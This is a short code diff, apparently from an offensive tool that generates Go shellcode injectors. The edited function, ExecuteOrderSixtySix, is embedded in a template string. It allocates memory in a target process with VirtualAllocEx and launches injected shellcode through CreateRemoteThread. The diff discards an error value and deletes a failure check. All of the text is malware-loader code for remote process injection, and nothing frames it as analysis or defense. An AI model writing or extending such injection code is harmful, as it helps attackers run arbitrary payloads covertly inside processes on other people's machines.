@@ -72,7 +72,7 @@ func ExecuteOrderSixtySix(shellcode []byte) {
     oldProtectCfg := PAGE_READWRITE
 
      /* allocating the appropriate amount of memory */
-    baseAddr, _, err := VirtualAllocEx.Call(
+    baseAddr, _, _ := VirtualAllocEx.Call(
         uintptr(process.Process),
         0,
         uintptr(len(shellcode)),
@@ -100,10 +100,6 @@ func ExecuteOrderSixtySix(shellcode []byte) {
 
     /* load remote thread */
     _, _, _ = CreateRemoteThread.Call(uintptr(process.Process), 0, 0, baseAddr, 0, 0, 0)
-        if err.Error() != "The operation completed successfully." {
-        os.Exit(1)
-    }
-
     select {}
 }
     `, targetProcess)
